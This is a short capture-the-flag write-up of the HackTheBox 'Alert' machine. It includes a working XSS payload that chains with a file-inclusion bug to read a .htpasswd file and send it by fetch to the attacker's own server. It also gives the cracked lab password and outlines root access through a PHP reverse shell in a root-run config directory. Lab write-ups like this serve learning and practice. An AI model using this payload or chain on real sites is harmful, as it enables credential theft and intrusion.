# Alert

# Nmap

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

# Site enumeration

First off I looked for subdomains and found statistics. It is protected by a http-auth I tried to bruteforce but could not get in.

On the main page I notice 2 things: 1) we can do XSS with the markdown feature 2) There is LFI on the file param. Let's combine this to fetch the statistics password hash

```
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://<MY_IP>:8000/?file_content=" + encodeURIComponent(data));
  });
</script>
```

We upload the script and get a hash back to our local server i crack it and get creds. albert:manchesterunited

We can login to the statistics page now. But there is nothing there let's try ssh. And we are in!!

# Priv esc

Running netstat -tunlp I found an open port on 8080 lets download the index file. It is called website monitor let's try locate it. We find it in /opt

Looking at the config file we see that it is run by root. So if we upload a php reverse shell we should get root. Let's try we get permissions denied... but if we put it in the config file it works!

We wget the new page and get root!

PAWNDDD

